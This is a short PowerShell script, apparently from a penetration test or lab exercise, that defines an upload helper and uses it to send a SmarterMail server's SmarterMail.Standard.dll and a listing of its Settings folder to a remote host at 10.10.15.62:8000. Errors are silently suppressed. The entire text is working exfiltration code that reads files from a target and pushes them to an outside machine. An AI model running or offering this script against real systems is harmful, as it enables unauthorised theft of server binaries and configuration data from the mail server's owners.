$ErrorActionPreference='Continue'
function Up($path,$name){ try{ $b=[IO.File]::ReadAllBytes($path); $w=New-Object Net.WebClient; $w.UploadData("http://10.10.15.62:8000/upload/$name",$b)|Out-Null }catch{} }
Up 'C:\Program Files (x86)\SmarterTools\SmarterMail\Service\SmarterMail.Standard.dll' 'SmarterMail.Standard.dll'
# also dump small related configs under Settings
Get-ChildItem 'C:\Program Files (x86)\SmarterTools\SmarterMail\Service\Settings' -ErrorAction SilentlyContinue | Select Name,Length | Out-String | Set-Content C:\Users\Public\settings_ls.txt
Up 'C:\Users\Public\settings_ls.txt' 'settings_ls.txt'
